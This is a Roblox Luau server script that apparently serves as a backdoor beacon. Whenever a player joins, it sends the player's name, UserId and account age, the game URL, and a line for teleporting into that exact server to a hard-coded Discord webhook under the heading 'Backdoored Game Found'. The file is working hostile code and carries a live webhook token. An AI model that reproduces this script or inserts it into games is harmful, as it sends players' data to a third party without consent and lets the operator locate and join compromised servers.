local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

local webhookURL = "https://discord.com/api/webhooks/1417505053224468631/awtWL6hMo3lYP6ECvR-ZKIR89h1fcruWUVfcC0Q9OYwXJuQKDFe2U5ukqlcD7-fCX4I-"

local function getGameUrl()
local placeName = MarketplaceService:GetProductInfo(game.PlaceId).Name
local placeId = game.PlaceId
local formattedName = placeName:lower():gsub("%s+", "-"):gsub("[^a-z0-9%-]", "")
return "https://www.roblox.com/games/" .. placeId .. "/" .. formattedName
end

local function sendWebhook(player)
local gameUrl = getGameUrl()
local embed = {
title = "USER DATA LOCATED",
description = "Backdoored Game Found",
color = 3447003,
fields = {
{ name = "Name:", value = player.Name },
{ name = "UserId:", value = tostring(player.UserId) },
{ name = "Game:", value = gameUrl },
{ name = "Account Age:", value = tostring(player.AccountAge) },
{ name = "Place:", value = 'game:GetService("TeleportService"):TeleportToPlaceInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '", game.Players.LocalPlayer)' }
},
footer = { text = "Webhook System :P" }
}
local data = { embeds = { embed }, content = "" }
local jsonData = HttpService:JSONEncode(data)
pcall(function()
HttpService:PostAsync(webhookURL, jsonData, Enum.HttpContentType.ApplicationJson)
end)
end

game.Players.PlayerAdded:Connect(function(plr)
sendWebhook(plr)
end)
